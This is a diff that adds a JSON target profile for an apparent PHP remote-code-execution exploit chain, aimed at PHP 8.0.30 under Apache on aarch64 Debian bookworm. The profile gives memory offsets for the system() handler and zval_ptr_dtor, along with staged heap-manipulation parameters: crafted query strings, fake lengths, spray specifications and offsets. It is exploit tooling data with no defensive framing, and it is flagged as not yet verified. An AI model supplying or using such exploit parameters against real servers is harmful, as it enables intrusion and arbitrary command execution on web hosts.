@@ -1,0 +1,29 @@
+{
+    "id": "php-8.0.30-apache-bookworm-aarch64",
+    "php_version": "8.0.30",
+    "sapi": "apache2handler",
+    "arch": "aarch64",
+    "os": "bookworm",
+    "workers": 150,
+    "rce_verified": false,
+    "build_note": "Public offsets; public leak shape differs, no public stage 3.",
+    "source": "https://github.com/devploit/php2shell (offset inventory, MIT)",
+    "offsets": {
+        "zif_system": "0x31ef70",
+        "zval_ptr_dtor": "0x40ddb0"
+    },
+    "stages": {
+        "a1_big": 78,
+        "a1_query": "q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v",
+        "b1_fake_len": 819200,
+        "b1_spec": "G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:400:0x137,G:511:0x137,X:900",
+        "a2_parts": 880,
+        "a2_depth": 64,
+        "a2_fillers": 115,
+        "b2_vl": 384,
+        "b2_n1": 500,
+        "b2_n2": 495,
+        "carrier_size": 384,
+        "main_s_offset": 1016728
+    }
+}
